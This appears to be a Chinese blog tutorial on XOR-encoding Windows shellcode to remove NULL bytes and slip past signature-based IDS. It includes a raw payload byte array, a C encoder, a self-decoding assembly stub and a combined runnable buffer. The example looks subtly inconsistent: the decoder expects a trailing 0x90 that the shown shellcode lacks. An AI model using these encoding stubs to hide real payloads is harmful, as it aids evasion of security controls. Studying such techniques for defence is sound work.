---
layout: post
title: 对shellcode编码
categories:
- SHELLCODE 
---

很多时候shellcode都会受到限制

例如所有字符串函数都会对NULL字节进行限制，通常我们要选择特殊的指令避免在shellcode中直接出现NULL字节

还有的函数要求shellcode中必须为可见字符的ascii值以及一些基于特征的IDS会对常见shellcode进行拦截。

##### 如何编码
- 完成shellcode的逻辑
- 使用编码技术队shellcode编码
- 构造十几字节的解码程序放在shellcode开始执行的位置

	/*
	*  对shellcode简单的编码程序
	*/
	
	#include <windows.h>
	#include <stdio.h>
	
	/* 要加密的代码 */
	char shellcode[] = 
	"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
	"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
	"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
	"\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
	"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
	"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
	"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
	"\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
	"\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
	"\x53\x68\x4C\x4E\x45\x4F\x68\x53\x48\x45\x4C\x8B\xC4\x53\x50\x50"
	"\x53\xFF\x57\xFC\x53\xFF\x57\xF8";
	
	
	/* 采用异或简单编码 */
	void encoder(char* input, unsigned char key, int display_flag)
	{
		int i = 0; 
		int len = 0;
		FILE* fp;
		unsigned char* output;
		len = strlen(input);
		output = (unsigned char*)malloc(len+1);
	
		if (!output) {
			printf("Memory error!\n");
			exit(0);
		}
	
		for (i = 0; i < len; ++i) {
			output[i] = input[i]^key;
		}
	
		if (!(fp = fopen("encode.txt", "w+"))) {
			printf("output file create error!\n");
			exit(0);
		}
	
		fprintf(fp, "\"");
		
		for (i = 0; i < len; ++i) {
			fprintf(fp, "\\x%0.2x", output[i]);
			if (0 == (i+1)%16) {
				fprintf(fp, "\"\n\"");
			}
		}
	
		fprintf(fp, "\";");
		fclose(fp);
	
		printf("dump the encode shellcode to encode.txt OK!\n");
		if (display_flag) {
			for (i = 0 ; i < len; ++i) {
				printf("\\x%0.2x", output[i]);
				if (0 == (i+1)%16) {
					printf("\n");
				}
			}
		}
	
		free(output);
	}
	
	
	int main()
	{
		encoder(shellcode, 0x44, 1);
		
		return 0;
	}
	
	
	
	/*
	encode.txt中的内容
	"\xb8\x2c\x2e\x4e\x7c\x5a\x2c\x27\xcd\x95\x0b\x2c\x76\x30\xd5\x48"
	"\xcf\xb0\xc9\x3a\xb0\x77\x9f\xf3\x40\x6f\xa7\x22\xff\x77\x76\x17"
	"\x2c\x31\x37\x21\x36\x10\x77\x96\x20\xcf\x1e\x74\xcf\x0f\x48\xcf"
	"\x0d\x58\xcf\x4d\xcf\x2d\x4c\xe9\x79\x2e\x4e\x7c\x5a\x31\x41\xd1"
	"\xbb\x13\xbc\xd1\x24\xcf\x01\x78\xcf\x08\x41\x3c\x47\x89\xcf\x1d"
	"\x64\x47\x99\x77\xbb\x03\xcf\x70\xff\x47\xb1\xdd\x4b\xfa\x42\x7e"
	"\x80\x30\x4c\x85\x8e\x43\x47\x94\x02\xaf\xb5\x7f\x10\x60\x58\x31"
	"\xa0\xcf\x1d\x60\x47\x99\x22\xcf\x78\x3f\xcf\x1d\x58\x47\x99\x47"
	"\x68\xff\xd1\x1b\xef\x13\x25\x79\x2e\x4e\x7c\x5a\x31\xed\x77\x9f"
	"\x17\x2c\x08\x0a\x01\x0b\x2c\x17\x0c\x01\x08\xcf\x80\x17\x14\x14"
	"\x17\xbb\x13\xb8\x17\xbb\x13\xbc";
		*/
	

-------------------------------------------------------------------------------

	/*
	* 解码程序
	*/
	#include <stdio.h>
	#include <windows.h>
	
	int main()
	{
		__asm {
			nop
			nop
			add eax, 0x14			;越过本段代码（本段代码刚好20字节）,eax直接指向被编码的shellcode
			xor ecx, ecx			;清空ecx
	decode_loop:
			mov bl, [ecx + eax]		;bx是16位,bl是8位即每次读取1个字节
			xor bl, 0x44			;这里的0x44就是在编码中用的key, 必须保持一致
			mov [eax + ecx], bl
	
			inc ecx					;下一个字节的下标
			cmp bl, 0x90			;读到的是不是NOP
			jne decode_loop			
	
			nop
			nop
		}
		return 0;
	}

###### 注意:
解码器认为shellcode的最后一个字节为0x90，所以编码前要注意在原始shellcode中加入一个字节0x90作为结尾，否则会产生错误


	/*	对shellcode进行编码并解码 */
	#include <stdio.h>
	
	char final_shellcode[] =
	"\x83\xC0\x14"
	"\x33\xC9"
	"\x8A\x1C\x01"
	"\x80\xF3\x44"
	"\x88\x1C\x08"
	"\x41"
	"\x80\xFB\x90"
	"\x75\xF1"		
	"\xb8\x2c\x2e\x4e\x7c\x5a\x2c\x27\xcd\x95\x0b\x2c\x76\x30\xd5\x48"
	"\xcf\xb0\xc9\x3a\xb0\x77\x9f\xf3\x40\x6f\xa7\x22\xff\x77\x76\x17"
	"\x2c\x31\x37\x21\x36\x10\x77\x96\x20\xcf\x1e\x74\xcf\x0f\x48\xcf"
	"\x0d\x58\xcf\x4d\xcf\x2d\x4c\xe9\x79\x2e\x4e\x7c\x5a\x31\x41\xd1"
	"\xbb\x13\xbc\xd1\x24\xcf\x01\x78\xcf\x08\x41\x3c\x47\x89\xcf\x1d"
	"\x64\x47\x99\x77\xbb\x03\xcf\x70\xff\x47\xb1\xdd\x4b\xfa\x42\x7e"
	"\x80\x30\x4c\x85\x8e\x43\x47\x94\x02\xaf\xb5\x7f\x10\x60\x58\x31"
	"\xa0\xcf\x1d\x60\x47\x99\x22\xcf\x78\x3f\xcf\x1d\x58\x47\x99\x47"
	"\x68\xff\xd1\x1b\xef\x13\x25\x79\x2e\x4e\x7c\x5a\x31\xed\x77\x9f"
	"\x17\x2c\x08\x0a\x01\x0b\x2c\x17\x0c\x01\x08\xcf\x80\x17\x14\x14"
	"\x17\xbb\x13\xb8\x17\xbb\x13\xbc";
	/* 前半段是解码程序，后半段是已经被编码的shellcode */
	
	void main()
	{
		__asm {
			lea eax, final_shellcode
			push eax
			ret
		} 
	
	}
	



OK！程序没有问题
